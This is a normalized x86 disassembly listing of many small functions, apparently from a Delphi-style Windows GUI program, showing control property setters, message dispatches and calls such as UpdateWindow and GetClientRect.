sub_43b728
call sub_4034e8
xor eax eax
mov [ rw-data ] eax
retn
sub_43b738
call sub_4034e4
xor eax eax
mov [ rw-data ] eax
retn
sub_43b748
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_43b7f8
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_43b810
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_43b85c
retn
sub_43ba14
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffdb
call sub_40348c
pop esi
retn
sub_43ba28
push esi
mov esi eax
mov edx esi
mov eax [ esi + 0x38 ]
mov si 0xffda
call sub_40348c
pop esi
retn
sub_43ba3c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_43ba48
mov eax 0x4
retn
sub_43ba50
retn
sub_43c641
jmp sub_403730
sub_43c92e
jmp sub_4039e4
sub_43c9a0
jmp sub_4039e4
sub_43c9ac
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
xor eax eax
call sub_43c6d4
sub_43cb2b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_41d654
retn
sub_43cb41
jmp sub_4039e4
sub_43cb68
jmp sub_4039e4
sub_43cbea
jmp sub_4039e4
sub_43cc12
jmp sub_4039e4
sub_43cc19
mov esp ebp
pop ebp
retn
sub_43ccd1
jmp sub_4039e4
sub_43cd28
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x58 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43ccf4
mov [ ebx + 0x58 ] esi
sub_43ce7c
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_43ce90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403440
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_43cf79
jmp sub_4039e4
sub_43cf80
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43d003
jmp sub_4039e4
sub_43d00a
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_43d3d8
xor eax eax
retn
sub_43d3dc
mov al [ eax + 0x58 ]
retn
sub_43d3e0
xor eax eax
retn
sub_43d3e4
cmp [ eax + 0x30 ] 0x0
setne al
retn
sub_43d3ec
mov eax [ eax + 0x30 ]
retn
sub_43d490
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x10 ]
retn
sub_43d53c
push ebx
mov ebx eax
xor eax eax
mov al [ ebx + 0x5b ]
mov al [ eax + rw-data ]
cmp al [ ebx + 0x61 ]
setne al
pop ebx
retn
sub_43d554
mov [ eax + 0x5d ] dl
retn
sub_43d558
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
xchg edx eax
call sub_44116c
sub_43d568
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_43da4b
jmp sub_4039e4
sub_43da52
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43dab4
test [ eax + 0x1c ] 0x1
jne r-xdata
mov [ eax + 0x158 ] edx
retn
mov [ eax + 0x150 ] 0x1
sub_43db38
xor ecx ecx
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x48 ]
mov [ edx + 0x8 ] ecx
mov eax [ eax + 0x4c ]
mov [ edx + 0xc ] eax
retn
sub_43dc55
jmp sub_4039e4
sub_43dc5c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43dd58
push eax
xor ecx ecx
mov edx 0xb037
call sub_43f334
retn
sub_43df19
add [ eax ] al
add [ esi + 0x3a ] dl
push eax
pop esp
je r-xdata
pop esi
retn
mov [ eax + 0x5c ] dl
test dl dl
je r-xdata
mov si 0xffee
call sub_40348c
sub_43dfca
jmp sub_4039e4
sub_43dfd1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43e0a8
cmp dl [ eax + 0x58 ]
je r-xdata
retn
mov [ eax + 0x58 ] dl
push 0x0
xor ecx ecx
mov edx 0xb00c
call sub_43f334
sub_43e0c0
push 0x0
xor ecx ecx
mov edx 0xe
call sub_43f334
retn
sub_43e0d0
push edx
mov edx 0xd
call sub_43f334
retn
sub_43e0dc
mov edx [ eax + 0xac ]
test edx edx
jle r-xdata
mov eax [ eax + 0x4c ]
retn
mov eax edx
retn
sub_43e0f0
mov edx [ eax + 0xa8 ]
test edx edx
jle r-xdata
mov eax [ eax + 0x48 ]
retn
mov eax edx
retn
sub_43e1d1
jmp sub_4039e4
sub_43e1d8
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43e1e0
cmp dl [ eax + 0x5f ]
je r-xdata
retn
mov [ eax + 0x5f ] dl
mov [ eax + 0x60 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
call sub_43f334
sub_43e250
cmp [ eax + 0x59 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x56 ] 0x0
je r-xdata
mov al 0x1
retn
sub_43e264
mov al [ eax + 0x9a ]
xor al 0x1
retn
sub_43e270
mov al [ eax + 0x60 ]
xor al 0x1
retn
sub_43e278
cmp dl [ eax + 0x59 ]
je r-xdata
retn
mov [ eax + 0x59 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
call sub_43f334
sub_43e29c
cmp dl [ eax + 0x99 ]
je r-xdata
retn
mov [ eax + 0x99 ] dl
mov [ eax + 0x9a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
call sub_43f334
sub_43e2c0
cmp dl [ eax + 0x9a ]
je r-xdata
retn
mov [ eax + 0x9a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb023
call sub_43f334
sub_43e308
mov al [ eax + 0x5a ]
xor al 0x1
retn
sub_43e310
cmp dl [ eax + 0x5a ]
je r-xdata
retn
mov [ eax + 0x5a ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb009
call sub_43f334
sub_43e334
cmp dl [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
call sub_43f334
sub_43e358
cmp dx [ eax + 0x78 ]
je r-xdata
retn
mov [ eax + 0x78 ] dx
push 0x0
xor ecx ecx
mov edx 0xb00f
call sub_43f334
sub_43e374
push ebx
mov ebx eax
call sub_43b2f4
cmp ebx eax
sete al
pop ebx
retn
sub_43e3ac
push esi
mov dl 0x1
mov si 0xffce
call sub_40348c
pop esi
retn
sub_43e4f6
jmp sub_4039e4
sub_43e4fd
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e620
test [ eax + 0x50 ] 0x40
setne cl
mov dl [ eax + 0x57 ]
call sub_43e594
retn
sub_43e674
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
sub_43e688
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_43e76d
jmp sub_4039e4
sub_43e78c
xor eax eax
retn
sub_43e790
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43e7a8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x5f ] 0x1
je r-xdata
mov al 0x1
retn
sub_43e7c0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
mov al [ eax + 0x5f ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_43e7dc
mov edx [ rw-data ]
mov ecx [ edx + 0x8 ]
mov edx [ rw-data ]
mov dl [ edx + 0x4 ]
call sub_43e7f4
retn
sub_43e8ec
retn
sub_43e8f0
cmp eax [ rw-data ]
sete al
retn
sub_43e964
push ebx
cmp [ eax + 0x112 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
sub_43ea80
push ebp
mov ebp esp
push esi
mov si 0xffd2
call sub_40348c
pop esi
pop ebp
retn 0x4
sub_43eac0
push ebx
cmp [ eax + 0x102 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
sub_43ed57
jmp sub_4039e4
sub_43ed5e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ed68
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov si 0xffe8
call sub_40348c
pop esi
retn
sub_43ed7c
push esi
mov esi eax
mov cl 0x1
mov eax esi
mov si 0xffe8
call sub_40348c
pop esi
retn
sub_43f04b
jmp sub_4039e4
sub_43f0f4
push esi
mov si 0xffee
call sub_40348c
pop esi
retn
sub_43f100
mov al 0x1
retn
sub_43f3d8
mov ecx [ edx ]
mov [ eax + 0x40 ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x44 ] ecx
mov ecx [ edx + 0x8 ]
sub ecx [ edx ]
mov [ eax + 0x48 ] ecx
mov ecx [ edx + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ eax + 0x4c ] ecx
call sub_43d7a0
retn
sub_43f3fc
retn
sub_43f615
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_416d48
mov [ ebx + 0x5e ] al
pop esi
pop ebx
retn
sub_43f630
mov al [ eax + 0x5e ]
xchg edx eax
call sub_419080
retn
sub_43f728
push ebx
cmp [ eax + 0x12a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
sub_43fd40
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43fd48
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43fd50
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_43fe08
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
retn
cmp [ edx + 0x4 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43fe28
push ebx
mov ebx eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x99 ]
mov eax ebx
call sub_43e29c
mov [ ebx + 0x9a ] 0x1
sub_43fe80
push ebx
mov ebx eax
cmp [ ebx + 0x56 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x84 ]
mov eax ebx
call sub_43e240
mov [ ebx + 0x56 ] 0x1
sub_43fea4
mov [ edx + 0xc ] 0x1
retn
sub_43feac
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb013
call sub_43f334
sub_43fec4
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
retn
push eax
xor ecx ecx
mov eax edx
mov edx 0xb014
call sub_43f334
sub_43fedc
xor eax eax
mov [ edx + 0xc ] eax
retn
sub_440142
jmp sub_4039e4
sub_440149
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_440174
mov eax [ r-xdata ]
retn
sub_440310
jmp sub_4039e4
sub_440317
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_440438
mov eax [ eax + 0xb8 ]
retn
sub_4404a0
push ebx
mov ebx eax
mov eax ebx
call sub_43e790
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax 0x20000
pop ebx
retn
sub_4404bc
mov edx [ eax + 0x6c ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_440654
mov eax [ eax + 0x74 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_440684
mov edx [ eax ]
call [ edx + 0x34 ]
retn
sub_44068c
call sub_43d20c
retn
sub_44078c
jmp sub_4039e4
sub_44094c
jmp sub_4039e4
sub_44099c
jmp sub_4039e4
sub_4409d4
retn
sub_440c5d
jmp sub_4039e4
sub_440de5
jmp sub_4039e4
sub_441147
jmp sub_4039e4
sub_4411f3
jmp sub_4039e4
sub_441200
inc [ eax + 0x160 ]
retn
sub_441208
dec [ eax + 0x160 ]
cmp [ eax + 0x160 ] 0x0
jne r-xdata
retn
test [ eax + 0x54 ] 0x10
je r-xdata
call sub_441228
sub_441228
xor edx edx
call sub_44116c
retn
sub_4412f5
jmp sub_4039e4
sub_4412fc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4413eb
jmp sub_4039e4
sub_441912
jmp sub_4039e4
sub_441919
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441ae1
jmp sub_4039e4
sub_441ae8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_441bbc
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
mov al 0x1
retn
sub_441da9
jmp sub_4039e4
sub_441db0
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x180 ] edx
pop ecx
pop ebp
retn
sub_441ea0
xor eax eax
retn
sub_441f08
cmp [ eax + 0x180 ] 0x0
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0xb033
call sub_43f334
sub_442036
jmp sub_403730
sub_44216b
jmp sub_4039e4
sub_442172
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44217c
jmp sub_403730
sub_442181
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45e194
call sub_403a98
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44273c
jmp sub_4039e4
sub_442743
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44274c
add esp 0xfffffff0
mov [ esp ] 0xf
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x10
retn
sub_442c4a
jmp sub_4039e4
sub_442c9c
push ebx
mov ebx eax
call sub_41bd7c
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax ebx
call sub_43f334
pop ebx
retn
sub_442cb8
mov ecx [ edx + 0x8 ]
push ecx
mov ecx [ edx + 0x4 ]
mov edx 0xb025
call sub_43f334
retn
sub_442ccc
push 0x0
xor ecx ecx
mov edx 0xb026
call sub_43f334
retn
sub_442cdc
push 0x0
xor ecx ecx
mov edx 0xb027
call sub_43f334
retn
sub_442f88
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_444c78
pop esi
retn
sub_44309c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4430ec
pop esi
retn
sub_4430b0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4431d8
pop esi
retn
sub_4430c4
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4430d8
push esi
mov esi eax
mov [ esi + 0x1f9 ] 0x0
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4431cb
jmp sub_4039e4
sub_4431d2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_443262
jmp sub_4039e4
sub_443269
pop ebx
pop ecx
pop ebp
retn
sub_443270
push esi
mov esi edx
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop esi
retn
sub_443280
retn
sub_443284
push ebx
cmp [ eax + 0x1c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
sub_4432a4
push ebx
cmp [ eax + 0x1ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
sub_443404
mov edx [ eax + 0x178 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_4434d4
retn
sub_4435ec
jmp sub_4039e4
sub_4435f3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4436be
jmp sub_4039e4
sub_4436e8
xor ecx ecx
mov [ edx + 0xc ] ecx
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
retn
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov edx [ edx + 0x8 ]
mov eax [ eax + 0x17c ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
sub_44377a
jmp sub_4039e4
sub_44394c
push ebx
cmp [ eax + 0x1e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
sub_443bf0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x180 ] eax
mov [ esi + 0x1a6 ] 0x0
pop esi
retn
sub_443ccc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov dx 0xb023
mov eax esi
call sub_4416f8
pop esi
retn
sub_443d90
push esi
mov si 0xffc1
call sub_40348c
pop esi
retn
sub_443dbc
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_443dd0
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_443de4
call sub_4416b8
retn
sub_443dec
call sub_4416b8
retn
sub_443df4
call sub_4416b8
retn
sub_443e9c
push ebx
mov ebx eax
mov eax ebx
call sub_43fd50
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x170 ]
call sub_41cf14
mov dx 0xb009
mov eax ebx
call sub_4416f8
pop ebx
retn
sub_444000
call sub_4416b8
retn
sub_444008
call sub_4416b8
retn
sub_444010
call sub_4416b8
retn
sub_444018
call sub_4416b8
retn
sub_44407c
push ebx
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx ecx
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_444512
jmp sub_4039e4
sub_444519
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4445f8
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
pop esi
retn
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xc0 ]
sub_44479c
push 0x0
xor ecx ecx
mov edx 0xb034
call sub_43f334
retn
sub_44483c
push ebx
mov ebx eax
mov eax ebx
call sub_444c6c
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x180 ]
push eax
call UpdateWindow
sub_444858
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
pop ebx
retn
sub_444a30
push ebx
push esi
mov esi edx
mov ebx eax
push esi
mov eax ebx
call sub_444968
push eax
call GetClientRect
pop esi
pop ebx
retn
sub_444a88
cmp edx [ eax + 0x16c ]
je r-xdata
retn
mov [ eax + 0x16c ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43f334
sub_444aa8
cmp dl [ eax + 0x1a5 ]
je r-xdata
retn
mov [ eax + 0x1a5 ] dl
mov [ eax + 0x1a9 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb010
call sub_43f334
sub_444acc
mov al [ eax + 0x1a9 ]
xor al 0x1
retn
sub_444ad8
cmp dl [ eax + 0x1a9 ]
je r-xdata
retn
mov [ eax + 0x1a9 ] dl
cmp [ eax + 0x30 ] 0x0
je r-xdata
test [ eax + 0x1c ] 0x2
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
call sub_43f334
sub_444b84
test [ eax + 0x54 ] 0x8
je r-xdata
call sub_444b28
retn
movsx edx dx
mov [ eax + 0x1a0 ] edx
retn
sub_444c60
jmp sub_4039e4
sub_444c67
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444e86
jmp sub_4039e4
sub_444e8d
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_444f94
call sub_43f104
retn
sub_4453e2
jmp sub_4039e4
sub_445478
mov eax [ r-xdata ]
retn
sub_4455df
jmp sub_4039e4
sub_4456f0
cmp dl [ eax + 0x165 ]
je r-xdata
retn
mov [ eax + 0x165 ] dl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43f334
sub_445710
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_43f334
sub_445a26
jmp sub_4039e4
sub_445b68
test [ eax + 0x52 ] 0x4
setne al
retn
sub_445cc4
jmp sub_4039e4
sub_445ccb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41d654
retn
sub_445ce7
jmp sub_4039e4
sub_445cf4
retn
sub_445dc8
mov [ edx + 0xc ] 0xffffffff
retn
sub_445e26
jmp sub_4039e4
sub_445e2d
pop ecx
pop ecx
pop ebp
retn
sub_445ecd
jmp sub_4039e4
sub_445ed4
pop ebx
mov esp ebp
pop ebp
retn
sub_445f40
call sub_441ec0
retn
sub_445fd3
jmp sub_4039e4
sub_445fda
pop esi
pop ecx
pop ecx
pop ebp
retn
sub_4461b9
jmp sub_4039e4
sub_4461c0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44631c
push ebx
mov ebx eax
mov eax ebx
call sub_44b2e4
or edx 0xffffffff
mov eax ebx
call sub_446448
pop ebx
retn
sub_4463f4
jmp sub_4039e4
sub_446448
cmp dx [ eax + 0x68 ]
je r-xdata
retn
mov [ eax + 0x68 ] dx
cmp [ eax + 0x6a ] 0x0
je r-xdata
call sub_446334
sub_4465b8
push ebx
mov ebx eax
mov eax ebx
call sub_44b39c
test al al
je r-xdata
pop ebx
retn
push 0xffffffff
call ImageList_DragShowNolock
sub_4465d0
push ebx
mov ebx eax
mov eax ebx
call sub_44b39c
test al al
je r-xdata
pop ebx
retn
push 0x0
call ImageList_DragShowNolock
sub_4466bc
push ebx
push esi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x100
mov edx esi
mov eax ebx
call sub_442af8
and [ ebx + 0x54 ] 0xfeff
pop esi
pop ebx
retn
sub_446757
jmp sub_4039e4
sub_44675e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446781
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41d654
retn
sub_44677a
jmp sub_4039e4
sub_446781
pop ebx
pop ecx
pop ebp
retn
sub_446788
retn
sub_4467f0
xor edx edx
mov eax [ eax + 0x8 ]
test eax eax
je r-xdata
mov eax edx
retn
mov eax [ eax + 0xc ]
inc edx
test eax eax
jne r-xdata
sub_446b5d
jmp sub_4039e4
sub_446d44
mov eax [ eax + 0x8 ]
jmp r-xdata
mov edx [ eax + 0xc ]
test edx edx
jne r-xdata
mov eax edx
retn
sub_446f30
jmp sub_4039e4
sub_446fe0
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
add [ ecx + 0x4 ] 0xc
retn
add [ ecx ] 0xc
retn
sub_446ff4
inc [ eax + 0x6c ]
retn
sub_446ff8
dec [ eax + 0x6c ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
retn
xor edx edx
mov [ eax + 0x6c ] edx
call sub_448878
sub_447158
call sub_447858
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0x4 ]
retn
sub_447b03
jmp sub_4039e4
sub_447b0a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447b27
lea eax [ ebp - 0xc ]
call sub_403fe0
retn
sub_447b20
jmp sub_4039e4
sub_447b27
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447e08
jmp sub_4039e4
sub_447e0f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447e2c
mov eax [ ebp - 0x4 ]
call sub_41d654
retn
sub_447e25
jmp sub_4039e4
sub_447e2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447e49
mov eax [ ebp - 0x4 ]
call sub_403290
retn
sub_447e42
jmp sub_4039e4
sub_447e49
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4482fd
jmp sub_4039e4
sub_448304
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44848f
jmp sub_4039e4
sub_448496
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44854b
jmp sub_4039e4
sub_448552
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_448640
jmp sub_4039e4
sub_448691
jmp sub_4039e4
sub_448698
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_448754
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_447064
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
sub_4488a0
cmp [ eax + 0x6c ] 0x0
jne r-xdata
retn
mov eax edx
call sub_446ba0
sub_4491a0
jmp sub_4039e4
sub_4491a7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449270
call GetCapture
retn
sub_449278
push ebx
mov ebx edx
push ebx
call GetCursorPos
call sub_40c93c
pop ebx
retn
sub_449288
push ebx
mov ebx eax
push 0x13
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
mov [ ebx + 0xc ] al
pop ebx
retn
sub_4494ee
jmp sub_4039e4
sub_4496e8
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
retn
push eax
call [ rw-data ]
retn
sub_4498fc
jmp sub_4039e4
sub_449903
pop ebx
mov esp ebp
pop ebp
retn
sub_44994e
add [ eax ] al
push ebx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xe0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
pop ebx
retn
sub_4499cb
jmp sub_4039e4
sub_4499d2
pop ebp
retn
sub_449a5a
jmp sub_4039e4
sub_449a61
pop ebp
retn
sub_44a1b0
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x30 ]
xchg edx eax
call sub_413ad0
retn
sub_44a1c8
mov al 0x1
retn
sub_44a1cc
mov edx [ eax + 0x5c ]
test edx edx
je r-xdata
call sub_41985c
retn
mov eax edx
retn
sub_44a1dc
cmp [ eax + 0x5c ] 0x0
je r-xdata
call sub_41982c
retn
mov al 0x1
retn
sub_44a4cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413a74
pop esi
pop ebx
retn
sub_44a4e0
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_44a51c
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44a780
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop ebx
retn
sub_44a794
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop ebx
retn
sub_44a7a8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop ebx
retn
sub_44a7bc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop ebx
retn
sub_44a7d0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop ebx
retn
sub_44a7e4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop ebx
